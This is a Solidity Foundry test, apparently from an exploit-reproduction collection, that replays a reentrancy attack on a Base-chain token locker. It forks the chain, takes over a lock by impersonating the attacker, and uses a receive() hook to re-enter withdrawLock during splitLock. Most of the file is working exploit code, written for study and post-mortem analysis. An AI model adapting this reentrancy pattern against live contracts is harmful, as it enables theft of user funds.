// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import '../interface.sol';

// @KeyInfo - Total Lost : 15.7k USD
// Attacker : https://basescan.org/address/0x3cc1edd8a25c912fcb51d7e61893e737c48cd98d
// Attack Contract : https://basescan.org/address/0x0f30ae8f41a5d3cc96abd07adf1550a9a0e557b5
// Vulnerable Contract : https://basescan.org/address/0xd6a7cfa86a41b8f40b8dfeb987582a479eb10693
// Attack Tx : https://basescan.org/tx/0x984cb29cdb4e92e5899e9c94768f8a34047d0e1074f9c4109364e3682e488873

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xd6a7cfa86a41b8f40b8dfeb987582a479eb10693#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1872857132363645205
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant LOCKER = 0x80b9C9C883e376c4aA43d72413aB1Bd6A64A0654;
address constant BIZNESS_TOKEN = 0xF3a605573B93Fd22496f471A88AE45F35C1df5A7;
address constant ATTACKER = 0x0F30AE8f41a5d3Cc96abd07Adf1550A9A0E557b5;

contract Bizness is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 24282214 - 1;
    uint256 lockId = 11;

    function setUp() public {
        vm.createSelectFork("base", blocknumToForkFrom);
        fundingToken = BIZNESS_TOKEN;
        vm.deal(address(this), 1 ether);
        console.log("hello");

        vm.prank(ATTACKER);
        ILocker(LOCKER).transferLock(lockId, address(this));
    }

    function testExploit() public balanceLog {
        ILocker locker = ILocker(LOCKER);

        Lock memory lockBefore = locker.locks(lockId);
        console.log("lockBefore.amount ", lockBefore.amount);
        // Step 1: Split the lock to trigger reentrancy
        uint256 newSplitId = locker.splitLock{value: 0.011 ether}(lockId, lockBefore.amount - 1, 1735353747);

        // EXPLOIT RESULT: 
        // - Original lock (lockId) is now withdrawn (empty)
        // - New lock (newSplitId) contains (lockBefore.amount - 1) tokens
        // - Contract balance increased by lockBefore.amount tokens
        Lock memory lockAfter = locker.locks(newSplitId);
        console.log("lockAfter.amount ", lockAfter.amount);
    }
    
    function withdrawLock(uint256 _splitId) public {
        // Step 3: withdraw full locked amount
        ILocker locker = ILocker(LOCKER);
        locker.withdrawLock(_splitId);
    }

    receive() external payable {
        // Step 2: Reentrancy entry point
        console.log('received 0.001 ether', msg.value);
        withdrawLock(lockId);
    }
}

struct Lock {
    address token;
    uint256 tokenId;
    address beneficiary;
    uint256 amount;
    uint256 unlockTime;
    bool withdrawn;
}

interface ILocker {
    function locks(uint256 lockId) external view returns (Lock memory);
    function splitLock(uint256 _id, uint256 _newAmount, uint256 _newUnlockTime) external payable returns (uint256 _splitId);
    function withdrawLock(uint256 _id) external;
    function transferLock(uint256 _id, address _newBeneficiary) external;
}